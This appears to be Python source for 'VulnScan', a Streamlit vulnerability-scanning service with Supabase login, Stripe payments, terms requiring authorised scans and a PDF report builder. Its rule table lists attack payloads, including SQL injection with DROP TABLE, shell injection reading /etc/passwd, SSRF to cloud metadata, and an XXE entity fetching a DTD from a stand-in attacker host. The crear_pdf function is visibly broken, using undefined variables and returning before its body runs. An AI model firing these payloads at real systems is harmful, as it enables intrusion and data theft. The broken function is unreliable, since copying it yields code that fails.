
import streamlit as st
import time
import pandas as pd
import os
import base64
import json
from datetime import datetime
from fpdf import FPDF
import requests
import random
import hashlib
import socket
from dotenv import load_dotenv
import os
load_dotenv()
import stripe
import re

from supabase import create_client, Client
from motores import _motor_basic_pasivo, _motor_pro_activo, _motor_enterprise_owasp

# --- CONEXIÓN A SUPABASE ---
@st.cache_resource
def init_connection():
    url = os.getenv("SUPABASE_URL")
    key = os.getenv("SUPABASE_KEY")
    return create_client(url, key)

supabase = init_connection()

# --- STRIPE CHECKOUT (PAGOS) ---
stripe.api_key = os.getenv("STRIPE_SECRET_KEY")
STRIPE_PRICES = {
    'pro_recurrente': 'price_1TVW8kAZ3L9CUgKeJE1yNZuY',
    'enterprise_recurrente': 'price_1TVW97AZ3L9CUgKe7ezI3HEc',
    'pro_unico': 'price_1TVWD1AZ3L9CUgKeNcQJnj2s',
    'enterprise_unico': 'price_1TVWE4AZ3L9CUgKeuiadcJAb',
    'pdf_unico': 'price_1TVWFkAZ3L9CUgKe5brIDxDO',
}


def generar_link_pago(price_id, email_usuario, tipo_compra, modo):
    """Genera una sesión de Stripe Checkout y devuelve su URL."""
    session = stripe.checkout.Session.create(
        payment_method_types=['card'],
        line_items=[{'price': price_id, 'quantity': 1}],
        mode=modo,
        customer_email=email_usuario,
        metadata={'email': email_usuario, 'tipo': tipo_compra},
        success_url=os.getenv("APP_URL", "http://localhost:8501") + "/?pago=exitoso",
        cancel_url=os.getenv("APP_URL", "http://localhost:8501") + "/?pago=cancelado",
    )
    return session.url



# --- INICIALIZACIÓN DE MEMORIA (Paso 1) ---
if 'historial_escaneos' not in st.session_state:
    st.session_state['historial_escaneos'] = []
# ------------------------------------------



def escanear_objetivo_real(
    dominio,
    incluir_puertos=False,
    incluir_cve_matching=False,
    incluir_owasp=False,
):
    """Pasivo (Basic/Pro): OSINT/DNS + cabeceras HTTP, sin mapeo de puertos.
    Pro (Active): puertos + CVE matching.
    Enterprise (OWASP): añade capa de pruebas OWASP (simulación controlada)."""
    dominio_limpio = dominio.replace("https://", "").replace("http://", "").split("/")[0]
    resultados = []

    resultados.extend(_motor_basic_pasivo(dominio_limpio))

    if incluir_puertos:
        resultados.extend(_motor_pro_activo(dominio_limpio, incluir_cve_matching))

    if incluir_owasp:
        resultados.extend(_motor_enterprise_owasp(dominio_limpio))

    return resultados

VULN_RULES_DB = {
    "CRITICAL": [
        {
            "nombre": "SQL Injection (SQLi)",
            "descripcion": "Inyección de consultas SQL no sanitizadas que permite lectura o manipulación de datos sensibles.",
            "penalizacion": -50,
            "payloads_prueba": [
                "' OR '1'='1' --",
                "' UNION SELECT NULL,NULL,NULL --",
                "'; DROP TABLE users; --",
            ],
        },
        {
            "nombre": "Remote Code Execution (RCE)",
            "descripcion": "Ejecución de comandos en servidor por entrada no validada o deserialización insegura.",
            "penalizacion": -55,
            "payloads_prueba": [
                "; id",
                "&& whoami",
                "$(cat /etc/passwd)",
            ],
        },
        {
            "nombre": "Broken Access Control",
            "descripcion": "Acceso no autorizado a recursos críticos por ausencia de controles de autorización robustos.",
            "penalizacion": -45,
            "payloads_prueba": [
                "/admin",
                "/api/v1/users?role=admin",
                "/internal/config",
            ],
        },
        {
            "nombre": "SSRF (Server-Side Request Forgery)",
            "descripcion": "Permite que el servidor realice peticiones no autorizadas a recursos internos o servicios cloud metadata.",
            "penalizacion": -45,
            "payloads_prueba": [
                "http://169.254.169.254/latest/meta-data/",
                "http://127.0.0.1:8080/admin",
                "file:///etc/passwd",
            ],
        },
        {
            "nombre": "XXE (XML External Entity)",
            "descripcion": "Procesamiento inseguro de XML que permite exfiltrar archivos locales o provocar SSRF/DoS.",
            "penalizacion": -40,
            "payloads_prueba": [
                "<!DOCTYPE x [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><root>&xxe;</root>",
                "<!DOCTYPE a [ <!ENTITY % d SYSTEM \"http://attacker/evil.dtd\"> %d; ]>",
                "<?xml version=\"1.0\"?><data>&xxe;</data>",
            ],
        },
        {
            "nombre": "Insecure Deserialization",
            "descripcion": "Deserialización de objetos no confiables que puede derivar en RCE, elevación de privilegios o bypass lógico.",
            "penalizacion": -42,
            "payloads_prueba": [
                "O:8:\"stdClass\":1:{s:4:\"role\";s:5:\"admin\";}",
                "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",
                "{\"@type\":\"java.lang.Runtime\",\"val\":\"calc\"}",
            ],
        },
        {
            "nombre": "IDOR (Insecure Direct Object References)",
            "descripcion": "Acceso directo a objetos sin control de autorización por manipulación de identificadores.",
            "penalizacion": -38,
            "payloads_prueba": [
                "/api/orders/1001 -> /api/orders/1002",
                "/users/42/profile",
                "/files/download?doc_id=9999",
            ],
        },
    ],
    "HIGH_MEDIUM": [
        {
            "nombre": "Cross-Site Scripting (XSS)",
            "descripcion": "Inyección de scripts en navegador de la víctima por salida no escapada.",
            "penalizacion": -25,
            "payloads_prueba": [
                "<script>alert(1)</script>",
                "\"><img src=x onerror=alert(1)>",
                "<svg/onload=alert(document.domain)>",
            ],
        },
        {
            "nombre": "Exposición de Puertos Sensibles",
            "descripcion": "Servicios administrativos expuestos públicamente sin segmentación ni restricciones de red.",
            "penalizacion": -20,
            "payloads_prueba": [
                "22/tcp open ssh",
                "3389/tcp open ms-wbt-server",
                "9200/tcp open elasticsearch",
            ],
        },
        {
            "nombre": "SSL/TLS Débil o Ausente",
            "descripcion": "Canal inseguro por certificado inválido o ausencia de cifrado HTTPS estricto.",
            "penalizacion": -15,
            "payloads_prueba": [
                "http://target.com",
                "TLSv1.0 enabled",
                "self-signed certificate",
            ],
        },
        {
            "nombre": "CSRF (Cross-Site Request Forgery)",
            "descripcion": "Ejecución de acciones en nombre de un usuario autenticado por falta de tokens anti-CSRF.",
            "penalizacion": -20,
            "payloads_prueba": [
                "<form action=\"https://target.com/change-email\" method=\"POST\">",
                "<img src=\"https://target.com/delete?id=1\">",
                "POST /transfer without CSRF token",
            ],
        },
        {
            "nombre": "CORS Misconfiguration",
            "descripcion": "Política CORS permisiva que permite acceso cruzado no autorizado a recursos sensibles.",
            "penalizacion": -18,
            "payloads_prueba": [
                "Origin: https://evil.com",
                "Access-Control-Allow-Origin: * with credentials",
                "Access-Control-Allow-Credentials: true",
            ],
        },
        {
            "nombre": "Security Misconfiguration",
            "descripcion": "Configuraciones por defecto inseguras, paneles expuestos o credenciales default en producción.",
            "penalizacion": -22,
            "payloads_prueba": [
                "admin:admin",
                "tomcat:tomcat",
                "Directory browsing enabled in production",
            ],
        },
        {
            "nombre": "Host Header Injection",
            "descripcion": "Manipulación del encabezado Host para envenenamiento de caché, reset password poisoning o SSRF.",
            "penalizacion": -17,
            "payloads_prueba": [
                "Host: evil.com",
                "X-Forwarded-Host: attacker.tld",
                "Host header with password reset link poisoning",
            ],
        },
        {
            "nombre": "Subdomain Takeover",
            "descripcion": "Subdominio apuntando a servicio externo no reclamado que puede ser secuestrado por un atacante.",
            "penalizacion": -19,
            "payloads_prueba": [
                "CNAME -> unclaimed-service.azurewebsites.net",
                "NXDOMAIN on third-party alias",
                "Fingerprint: There isn't a GitHub Pages site here",
            ],
        },
    ],
    "LOW_INFO": [
        {
            "nombre": "Security Headers Ausentes",
            "descripcion": "Faltan cabeceras de endurecimiento del navegador como CSP, HSTS o X-Frame-Options.",
            "penalizacion": -8,
            "payloads_prueba": [
                "Missing Content-Security-Policy",
                "Missing Strict-Transport-Security",
                "Missing X-Frame-Options",
            ],
        },
        {
            "nombre": "Divulgación de Información de Versión",
            "descripcion": "El servidor expone versión de software que facilita fingerprinting para ataques dirigidos.",
            "penalizacion": -6,
            "payloads_prueba": [
                "Server: Apache/2.4.49",
                "X-Powered-By: PHP/7.2.34",
                "Express/4.17.1",
            ],
        },
        {
            "nombre": "Directory Listing Habilitado",
            "descripcion": "Listado de directorios público que revela estructura interna y artefactos sensibles.",
            "penalizacion": -7,
            "payloads_prueba": [
                "GET /uploads/",
                "Index of /backup/",
                "GET /.git/",
            ],
        },
        {
            "nombre": "Clickjacking (Falta de X-Frame-Options)",
            "descripcion": "La aplicación puede ser embebida en iframes maliciosos por ausencia de protección anti-frame.",
            "penalizacion": -6,
            "payloads_prueba": [
                "Missing X-Frame-Options",
                "Missing frame-ancestors in CSP",
                "<iframe src=\"https://target.com\"></iframe>",
            ],
        },
        {
            "nombre": "Cookie sin flags HttpOnly/Secure",
            "descripcion": "Cookies de sesión sin atributos de seguridad que facilitan robo por XSS o transmisión insegura.",
            "penalizacion": -7,
            "payloads_prueba": [
                "Set-Cookie: sessionid=abc123; Path=/",
                "Missing HttpOnly",
                "Missing Secure",
            ],
        },
        {
            "nombre": "Directorio de listado habilitado (Directory Listing)",
            "descripcion": "Servidor web expone listado de ficheros y estructura interna de directorios.",
            "penalizacion": -7,
            "payloads_prueba": [
                "GET /assets/",
                "Index of /logs/",
                "Autoindex on",
            ],
        },
    ],
}



# Configuración básica (SIEMPRE PRIMERO)
st.set_page_config(page_title="VulnScan", layout="wide", initial_sidebar_state="expanded")
# --- MEMORIA DE DOMINIOS VERIFICADOS ---
if 'dominios_verificados' not in st.session_state:
    st.session_state['dominios_verificados'] = [] # Lista vacía al empezar

# Plan por defecto: evita AttributeError si la fila en BD aún no está lista
if 'plan_activo' not in st.session_state:
    st.session_state['plan_activo'] = 'Basic'

# ==========================================
# 1. SISTEMA DE LOGIN (MURO ENTERPRISE)
# ==========================================
if 'usuario_autenticado' not in st.session_state:
    st.session_state['usuario_autenticado'] = False
if 'mostrar_terminos' not in st.session_state:
    st.session_state['mostrar_terminos'] = False


def _query_param_terms_activo():
    try:
        qp = st.query_params
        v = qp.get("terms")
        if v is None:
            return False
        if isinstance(v, (list, tuple)):
            return bool(v) and str(v[0]) == "1"
        return str(v) == "1"
    except Exception:
        return False


# --- FUNCIONES MAESTRAS DE BASE DE DATOS (MEMORIA) ---
def _normalizar_dominio(dominio):
    if not dominio:
        return ""
    return dominio.strip().replace("https://", "").replace("http://", "").split("/")[0].lower()


def _parse_objetivos_mes_json(raw):
    """Columna usuarios.objetivos_mes_json: {mes, dominios} o JSON string."""
    if raw is None:
        return {"mes": None, "dominios": []}
    if isinstance(raw, str):
        s = raw.strip()
        if not s:
            return {"mes": None, "dominios": []}
        try:
            raw = json.loads(s)
        except json.JSONDecodeError:
            return {"mes": None, "dominios": []}
    if not isinstance(raw, dict):
        return {"mes": None, "dominios": []}
    mes = raw.get("mes") or raw.get("_obj_mes")
    doms = raw.get("dominios")
    if doms is None:
        doms = raw.get("_obj_dom_list", [])
    if not isinstance(doms, list):
        doms = []
    return {"mes": mes, "dominios": [_normalizar_dominio(str(d)) for d in doms if d]}


def _parse_historial_dominios_json(raw):
    """Columna usuarios.historial_dominios_json: lista de dominios (JSON o lista)."""
    if raw is None:
        return []
    if isinstance(raw, str):
        s = raw.strip()
        if not s:
            return []
        try:
            raw = json.loads(s)
        except json.JSONDecodeError:
            return []
    if not isinstance(raw, list):
        return []
    out = []
    for d in raw[:10]:
        nd = _normalizar_dominio(str(d))
        if nd and nd not in out:
            out.append(nd)
    return out[:5]


def _provision_usuario_supabase(email):
    """Inserta fila mínima en `usuarios` (plan Basic, contadores en 0). Auto-provisioning tras registro o login."""
    email_clean = (email or "").strip()
    if not email_clean:
        return False
    # plan_activo = Basic; objetivos_escaneados / escaneos_realizados según columnas en Supabase.
    base = {
        "email": email_clean,
        "plan_activo": "Basic",
        "escaneos_realizados": 0,
    }
    intentos = [
        {**base, "objetivos_escaneados": 0},
        base,
    ]
    ultimo_error = None
    for fila in intentos:
        try:
            supabase.table("usuarios").insert(fila).execute()
            return True
        except Exception as e:
            ultimo_error = e
            err = str(e).lower()
            if "duplicate" in err or "unique" in err or "23505" in err:
                return True
            continue
    print(f"[provision usuarios] {ultimo_error!r}")
    return False


def _aplicar_fila_usuario_a_sesion(datos):
    if "plan_activo" in datos and datos["plan_activo"] not in (None, ""):
        st.session_state["plan_activo"] = datos["plan_activo"]
    else:
        st.session_state["plan_activo"] = "Basic"

    st.session_state["fecha_vencimiento"] = datos.get("fecha_vencimiento", "Sin caducidad")
    st.session_state["api_key_real"] = datos.get("api_key_real", None)
    st.session_state["webhook_url"] = datos.get("webhook_url", "")
    st.session_state["cancelacion_pendiente"] = datos.get("cancelacion_pendiente", False)
    try:
        base_esc = datos.get("escaneos_realizados")
        if base_esc is None and datos.get("objetivos_escaneados") is not None:
            base_esc = datos.get("objetivos_escaneados")
        st.session_state["escaneos_realizados"] = int(base_esc or 0)
    except (TypeError, ValueError):
        st.session_state["escaneos_realizados"] = 0
    st.session_state["objetivos_mes_data"] = _parse_objetivos_mes_json(datos.get("objetivos_mes_json"))
    st.session_state["historial_dominios_list"] = _parse_historial_dominios_json(
        datos.get("historial_dominios_json")
    )
    st.session_state["trial_pro_usada"] = bool(datos.get("trial_pro_usada", False))
    st.session_state["fecha_inicio_trial"] = datos.get("fecha_inicio_trial")
    st.session_state["tokens_pro"] = int(datos.get("tokens_pro") or 0)
    st.session_state["tokens_ent"] = int(datos.get("tokens_ent") or 0)
    st.session_state["tokens_pdf"] = int(datos.get("tokens_pdf") or 0)
    st.session_state["reporte_pdf_desbloqueado"] = datos.get("reporte_pdf_desbloqueado", None)
    st.session_state["scheduler_activo"] = bool(datos.get("scheduler_activo", False))
    st.session_state["scheduler_passive_on"] = bool(datos.get("scheduler_passive_on", True))
    st.session_state["scheduler_pro_on"] = bool(datos.get("scheduler_pro_on", False))
    st.session_state["scheduler_enterprise_on"] = bool(datos.get("scheduler_enterprise_on", False))
    st.session_state["scheduler_freq_passive"] = int(datos.get("scheduler_freq_passive") or 7)
    st.session_state["scheduler_freq_pro"] = int(datos.get("scheduler_freq_pro") or 15)
    st.session_state["scheduler_freq_enterprise"] = int(datos.get("scheduler_freq_enterprise") or 7)
    try:
        verificados = supabase.table("activos_verificados").select("dominio").eq("email_cliente", datos.get("email", "")).execute()
        st.session_state["dominios_verificados"] = [r["dominio"] for r in verificados.data]
        print(f"[DEBUG] dominios cargados: {st.session_state['dominios_verificados']}")
    except Exception:
        st.session_state["dominios_verificados"] = []
        print(f"[DEBUG dominios_verificados] Error: {Exception}")

def cargar_perfil_usuario(email):
    if not email:
        return
    try:
        respuesta = supabase.table("usuarios").select("*").eq("email", email).execute()
        if not respuesta.data:
            _provision_usuario_supabase(email)
            respuesta = supabase.table("usuarios").select("*").eq("email", email).execute()

        if respuesta.data:
            _aplicar_fila_usuario_a_sesion(respuesta.data[0])
        else:
            st.session_state["plan_activo"] = "Basic"
            st.session_state["escaneos_realizados"] = 0
            st.session_state.setdefault("objetivos_mes_data", {"mes": None, "dominios": []})
            st.session_state.setdefault("historial_dominios_list", [])
            st.session_state.setdefault("trial_pro_usada", False)
            st.session_state.setdefault("fecha_inicio_trial", None)
    except Exception as e:
        print(f"Error cargando perfil: {e}")
        st.session_state["plan_activo"] = "Basic"

def actualizar_usuario_supabase(email, campo, valor, escribir_en_sesion=True):
    email_clean = (email or "").strip()
    try:
        res = (
            supabase.table("usuarios")
            .update({campo: valor})
            .eq("email", email_clean)
            .select()
            .execute()
        )
        print(
            f"[usuarios.update] email={email_clean!r} campo={campo!r} valor={valor!r} "
            f"data={getattr(res, 'data', None)} count={len(getattr(res, 'data', None) or [])}"
        )
        rows = getattr(res, "data", None) or []
        if len(rows) == 0:
            print(
                "[usuarios.update] ADVERTENCIA: 0 filas actualizadas (¿email distinto en BD, "
                "RLS o fila inexistente en usuarios?)"
            )
        if escribir_en_sesion:
            st.session_state[campo] = valor
    except Exception as e:
        print(f"[usuarios.update] EXCEPCIÓN: {e!r}")
        st.error(f"Error al guardar en base de datos: {e}")

# Refresh: si no hay plan o sigue en Basic, reconciliar con Supabase (evita quedarse en Basic con Enterprise en BD)
if st.session_state.get("usuario_autenticado") and st.session_state.get("email_usuario"):
    _pa = st.session_state.get("plan_activo", "Basic")
    if _pa in (None, "", "Basic"):
        cargar_perfil_usuario(st.session_state["email_usuario"])
# -----------------------------------------------------

if not st.session_state['usuario_autenticado']:
    st.markdown(
        """
        <style>
            [data-testid="stAppViewContainer"] {
                background: radial-gradient(circle at 20% 20%, #1a2231 0%, #0f111a 45%, #090b12 100%);
            }
            [data-testid="stHeader"] {
                display: none;
            }
            [data-testid="stDecoration"] {
                display: none;
            }
            [data-testid="stToolbar"] {
                display: none !important;
            }
            #MainMenu, footer {
                visibility: hidden;
            }
            .block-container {
                padding-top: 1.5vh !important;
            }
            .auth-title {
                text-align: center;
                color: #ffffff;
                font-size: 2.15rem;
                font-weight: 700;
                margin-top: 0.15rem;
                margin-bottom: 0.25rem;
                letter-spacing: 0.2px;
            }
            .auth-subtitle {
                text-align: center;
                color: #9aa4af;
                margin-bottom: 1rem;
            }
            .auth-card {
                background: linear-gradient(165deg, rgba(255,255,255,0.045) 0%, rgba(255,255,255,0.018) 45%, rgba(0,0,0,0.14) 100%);
                border: 1px solid rgba(255, 255, 255, 0.14);
                border-radius: 20px;
                padding: 22px 24px 14px 24px;
                box-shadow: 0 18px 50px rgba(0, 0, 0, 0.45);
                backdrop-filter: blur(6px);
            }
            div[data-testid="stTextInput"] label p {
                color: #d8dde3 !important;
                font-size: 0.93rem !important;
                font-weight: 600;
            }
            div[data-testid="stTextInput"] input {
                background-color: rgba(14, 22, 35, 0.85) !important;
                border: 1px solid rgba(255,255,255,0.14) !important;
                border-radius: 10px !important;
                color: #f5f7fa !important;
            }
            div[data-testid="stTextInput"] input:focus {
                border-color: rgba(0,255,204,0.7) !important;
                box-shadow: 0 0 0 1px rgba(0,255,204,0.25);
            }
            div[data-testid="stForm"] [data-testid="stFormSubmitButton"] > button {
                background-color: #00FFCC !important;
                color: #031a16 !important;
                font-weight: 700;
                border: none !important;
                border-radius: 10px !important;
                transition: all 0.2s ease-in-out;
            }
            div[data-testid="stForm"] [data-testid="stFormSubmitButton"] > button:hover {
                box-shadow: 0 0 0 2px rgba(0, 255, 204, 0.35);
                transform: translateY(-1px);
            }
            .auth-error {
                margin-top: 0.8rem;
                border: 1px solid rgba(255, 92, 92, 0.35);
                background: rgba(255, 92, 92, 0.1);
                color: #ffc9c9;
                border-radius: 10px;
                padding: 0.7rem 0.9rem;
                font-size: 0.95rem;
            }
        </style>
        """,
        unsafe_allow_html=True
    )

    if _query_param_terms_activo():
        st.session_state["mostrar_terminos"] = True

    # Detectar vuelta de Stripe con pago exitoso
    pago_param = st.query_params.get("pago")
    if pago_param == "exitoso":
        email_recarga = st.session_state.get("email_usuario", "")
        if email_recarga:
            cargar_perfil_usuario(email_recarga)
        st.query_params.clear()
        st.success("✅ Pago completado. Ya puedes descargar tu reporte.")

    if st.session_state.get("mostrar_terminos"):
        st.markdown("<br>", unsafe_allow_html=True)
        _tcl, _tcc, _tcr = st.columns([1, 1.6, 1])
        with _tcc:
            st.markdown("<div class='auth-card'>", unsafe_allow_html=True)
            st.markdown(
                "<h2 style='text-align:center;color:#fff;margin-bottom:0.35rem;'>Términos y condiciones de uso</h2>"
                "<p style='text-align:center;color:#9aa4af;font-size:0.9rem;margin-bottom:1.1rem;'>"
                "VulnScan · Documento legal e informativo</p>",
                unsafe_allow_html=True,
            )
            st.markdown(
                """
### 1. Autorización obligatoria

Al utilizar esta herramienta, el usuario declara y garantiza que:

- Es el **propietario legal** del dominio que está escaneando, **o**
- Tiene **autorización expresa y por escrito** del propietario del dominio para realizar pruebas de seguridad.

El uso de esta herramienta con fines maliciosos o contra objetivos **sin consentimiento** está estrictamente prohibido y puede ser constitutivo de delito.

### 2. Exención de responsabilidad (liability)

**VulnScan** se proporciona *«tal cual»*, sin garantías de ningún tipo.

No nos hacemos responsables de cualquier daño, interrupción de servicio o caída del servidor que pueda ocurrir durante o después de un escaneo profundo (Active Scan / OWASP).

El usuario asume **toda la responsabilidad legal** derivada del uso de los resultados obtenidos.

### 3. Naturaleza de los resultados

Los informes generados son de carácter **informativo y educativo**. La detección de vulnerabilidades se basa en técnicas de escaneo automatizado:

- Un resultado negativo **no garantiza** que el sistema sea 100 % invulnerable.
- Un resultado positivo (vulnerabilidad detectada) debe ser **verificado manualmente** por un profesional.

### 4. Política de uso ético

Está prohibido el uso de la plataforma para:

- Cualquier actividad que vulnere leyes locales, nacionales o internacionales.
- Intentar degradar el rendimiento de la plataforma o realizar ingeniería inversa sobre el motor de escaneo.

### 5. Conservación de registros y cooperación

Podemos conservar metadatos de uso (por ejemplo, horarios de acceso u objetivos declarados en la aplicación) el tiempo necesario para **prevenir abusos**, cumplir la normativa aplicable y cooperar con autoridades ante indicios de uso ilícito.

### 6. Modificaciones

Nos reservamos el derecho a **actualizar** estos términos. El uso continuado de la plataforma tras la publicación de cambios implica la aceptación de la versión vigente, salvo que la ley exija otro procedimiento.

---

*Si no estás de acuerdo con estos términos, no utilices la herramienta ni registres una cuenta.*
""",
                unsafe_allow_html=False,
            )
            if st.button("← Volver al acceso", use_container_width=True, key="btn_volver_terminos"):
                st.session_state["mostrar_terminos"] = False
                try:
                    st.query_params.clear()
                except Exception:
                    pass
                st.rerun()
            st.markdown("</div>", unsafe_allow_html=True)
        st.stop()

    st.markdown("<br>", unsafe_allow_html=True)
    col_left, col_center, col_right = st.columns([1, 1.6, 1])
    with col_center:
        logo_path = os.path.join(carpeta_actual := os.path.dirname(os.path.abspath(__file__)), "logo.png.png")
        if not os.path.exists(logo_path):
            logo_path = os.path.join(carpeta_actual, "logo.png")
        st.markdown("<div class='auth-card'>", unsafe_allow_html=True)
        st.markdown("<h1 style='text-align: center;'>Vuln<span style='color: #00FFCC;'>Scan</span></h1>", unsafe_allow_html=True)
        if os.path.exists(logo_path):
            logo_left, logo_center, logo_right = st.columns([1, 2, 1])
            with logo_center:
                st.image(logo_path, width=520)
        st.markdown("<p class='auth-title'>Portal de Seguridad Enterprise</p>", unsafe_allow_html=True)
        st.markdown("<p class='auth-subtitle'>Acceso seguro a la plataforma SaaS de ciberseguridad</p>", unsafe_allow_html=True)

        tab_login, tab_registro = st.tabs(["Iniciar Sesión", "Crear Cuenta"])

        with tab_login:
            with st.form("login_form", clear_on_submit=False):
                email = st.text_input("Email Corporativo", placeholder="user@gmail.com")
                password = st.text_input("Contraseña", type="password", placeholder="********")
                submit = st.form_submit_button("Iniciar Sesión", use_container_width=True)

                if submit:
                    try:
                        # --- CERRADURA DE SUPABASE ---
                        respuesta = supabase.auth.sign_in_with_password({"email": email, "password": password})

                        # Si pasa de la línea anterior, las credenciales son correctas
                        st.session_state['usuario_autenticado'] = True
                        st.session_state['email_usuario'] = respuesta.user.email
                        st.session_state['datos_cliente_cargados'] = False
                        # AQUÍ ACTIVAMOS LA MAGIA: Cargamos su perfil real de Supabase
                        cargar_perfil_usuario(st.session_state['email_usuario'])
                        st.rerun()
                    except Exception:
                        # Si Supabase rechaza el login, mostramos tu alerta roja original
                        st.markdown(
                            "<div class='auth-error'>Acceso denegado. Verifica tus credenciales corporativas e inténtalo nuevamente.</div>",
                            unsafe_allow_html=True
                        )

        with tab_registro:
            st.markdown(
                "<p style='color:#9aa4af;font-size:0.92rem;margin:0 0 0.6rem 0;'>"
                "Crea tu cuenta corporativa. Lee primero los "
                '<a href="?terms=1" style="color:#00FFCC;font-weight:600;text-decoration:underline;">términos</a>'
                " de uso.</p>",
                unsafe_allow_html=True,
            )
            if st.button("📄 Abrir pantalla de términos completos", key="btn_abrir_terminos_reg", use_container_width=False):
                st.session_state["mostrar_terminos"] = True
                st.rerun()

            with st.form("register_form", clear_on_submit=False):
                email_reg = st.text_input("Email", key="reg_email_input", placeholder="usuario@empresa.com")
                password_reg = st.text_input(
                    "Contraseña", type="password", key="reg_password_input", placeholder="********"
                )
                acepto_terminos = st.checkbox(
                    "Confirmo que he leído y acepto los términos de uso y condiciones.",
                    value=False,
                    key="reg_chk_terminos",
                )
                submit_reg = st.form_submit_button("Registrarse", use_container_width=True)

                if submit_reg:
                    if not acepto_terminos:
                        st.warning("Debes marcar la casilla de aceptación de términos para registrarte.")
                    elif not (email_reg or "").strip() or not password_reg:
                        st.warning("Introduce un email y una contraseña válidos.")
                    elif len(password_reg) < 6:
                        st.warning("La contraseña debe tener al menos 6 caracteres (requisito habitual de Supabase).")
                    else:
                        try:
                            reg_resp = supabase.auth.sign_up(
                                {"email": email_reg.strip(), "password": password_reg}
                            )
                            email_creado = email_reg.strip()
                            if getattr(reg_resp, "user", None) and getattr(reg_resp.user, "email", None):
                                email_creado = reg_resp.user.email
                            if not _provision_usuario_supabase(email_creado):
                                st.warning(
                                    "Tu cuenta de acceso se creó, pero no pudimos crear la ficha en `usuarios` ahora mismo "
                                    "(revisa RLS o columnas en Supabase). Se intentará de nuevo automáticamente al iniciar sesión."
                                )
                            st.success(
                                "Cuenta creada correctamente. Ya puedes iniciar sesión en la pestaña **Iniciar Sesión**. "
                                "Si tu proyecto Supabase exige confirmación por correo, revisa tu bandeja de entrada antes de entrar."
                            )
                        except Exception as e:
                            detalle = getattr(e, "message", None) or str(e)
                            st.error(f"No se pudo completar el registro. {detalle}")

        st.markdown("</div>", unsafe_allow_html=True)

    # 🛑 ESTA LÍNEA ES LA MAGIA: Bloquea todo lo de abajo si no estás logueado
    st.stop()



# --- FUNCIÓN PARA GENERAR EL PDF MULTIPÁGINA (NIVEL ENTERPRISE) ---

class ReportePDF(FPDF):
    def header(self):
        # No ponemos encabezado en la primera página (Portada)
        if self.page_no() > 1:
            self.set_font('Helvetica', 'B', 10)
            self.set_text_color(100, 100, 100)
            self.cell(0, 10, 'VulnScan - Threat Intelligence Report', 0, 0, 'L')
            self.cell(0, 10, 'ESTRICTAMENTE CONFIDENCIAL', 0, 1, 'R')
            self.line(10, 20, 200, 20)
            self.ln(5)

    def footer(self):
        # Pie de página con el número
        if self.page_no() > 1:
            self.set_y(-15)
            self.set_font('Helvetica', 'I', 8)
            self.set_text_color(150, 150, 150)
            self.cell(0, 10, f'Página {self.page_no()}', 0, 0, 'C')

def crear_pdf(dominio, resultados):
    texto = texto.replace('\u2014', '-').replace('\u2013', '-').replace('\u2019', "'").replace('\u201c', '"').replace('\u201d', '"').replace('\u2192', '->')
    texto = re.sub(r'[^\x00-\xFF]', '', texto)
    return texto
    resultados = [limpiar(r) for r in resultados]
    resultados_unicos = []
    for r in resultados:
        if r not in resultados_unicos:
            resultados_unicos.append(r)
    resultados = resultados_unicos

    # 1. Calculamos las métricas para el resumen ejecutivo
    crit_count = sum(1 for r in resultados if "🔴" in r or "🚨" in r)
    med_count = sum(1 for r in resultados if "⚠️" in r or "🟡" in r)
    
    puntos_a_restar = (crit_count * 15) + (med_count * 7)
    nota_final = max(5, min(100, 100 - puntos_a_restar))
    
    if nota_final >= 80: nivel_riesgo = "Optimo (Bajo Riesgo)"
    elif 50 <= nota_final <= 79: nivel_riesgo = "Moderado"
    else: nivel_riesgo = "CRITICO (Alto Riesgo)"

    pdf = ReportePDF()
    pdf.set_auto_page_break(auto=True, margin=15)
    
    # ==========================================
    # PÁGINA 1: PORTADA CORPORATIVA (Logo a 2 colores)
    # ==========================================
    pdf.add_page()
    pdf.set_fill_color(15, 17, 26) # Fondo oscuro premium
    pdf.rect(0, 0, 210, 297, 'F')
    
    pdf.set_y(90)
    pdf.set_font("Helvetica", "B", 34)
    
    # Truco para poner Vuln (Blanco) y Scan (Azul) centrados
    ancho_vuln = pdf.get_string_width("Vuln")
    ancho_scan = pdf.get_string_width("Scan Enterprise")
    inicio_x = (210 - (ancho_vuln + ancho_scan)) / 2  # Centramos matemáticamente
    
    pdf.set_x(inicio_x)
    pdf.set_text_color(255, 255, 255) # Blanco
    pdf.cell(ancho_vuln, 15, "Vuln", ln=0)
    pdf.set_text_color(0, 150, 255) # Azul brillante (estilo login)
    pdf.cell(ancho_scan, 15, "Scan Enterprise", ln=True)
    
    pdf.set_font("Helvetica", "", 16)
    pdf.set_text_color(0, 255, 204) # Cian corporativo
    pdf.cell(0, 10, "Auditoria de Seguridad Perimetral y OSINT", ln=True, align='C')
    
    pdf.ln(35)
    pdf.set_font("Helvetica", "B", 14)
    pdf.set_text_color(255, 255, 255)
    pdf.cell(0, 10, f"Objetivo Analizado: {dominio}", ln=True, align='C')
    
    fecha_actual = datetime.now().strftime("%d de %B de %Y")
    pdf.set_font("Helvetica", "", 12)
    pdf.set_text_color(150, 150, 150)
    pdf.cell(0, 10, f"Fecha de emision: {fecha_actual}", ln=True, align='C')
    
    pdf.set_y(250)
    pdf.set_font("Helvetica", "B", 12)
    pdf.set_text_color(255, 75, 75)
    pdf.cell(0, 10, "DOCUMENTO ESTRICTAMENTE CONFIDENCIAL", ln=True, align='C')

    # ==========================================
    # PÁGINA 2: RESUMEN EJECUTIVO
    # ==========================================
    pdf.add_page()
    pdf.set_text_color(0, 0, 0)
    pdf.set_font("Helvetica", "B", 20)
    pdf.cell(0, 15, "1. Resumen Ejecutivo", ln=True)
    pdf.line(10, pdf.get_y(), 200, pdf.get_y())
    pdf.ln(5)
    
    pdf.set_font("Helvetica", "", 11)
    texto_resumen = (f"El presente documento detalla los resultados de la auditoria de seguridad externa (OSINT) "
                     f"realizada sobre la infraestructura del dominio {dominio}. El proposito de este informe es "
                     f"proporcionar a la direccion y a los equipos tecnicos una vision clara del nivel de exposicion "
                     f"actual y los riesgos asociados a su superficie de ataque digital.")
    pdf.multi_cell(0, 6, texto_resumen)
    pdf.ln(10)
    
    pdf.set_fill_color(245, 245, 245)
    pdf.rect(10, pdf.get_y(), 190, 40, 'F')
    pdf.set_y(pdf.get_y() + 5)
    pdf.set_font("Helvetica", "B", 14)
    pdf.cell(0, 10, f"   Indice de Seguridad Global: {nota_final}/100", ln=True)
    pdf.set_font("Helvetica", "", 12)
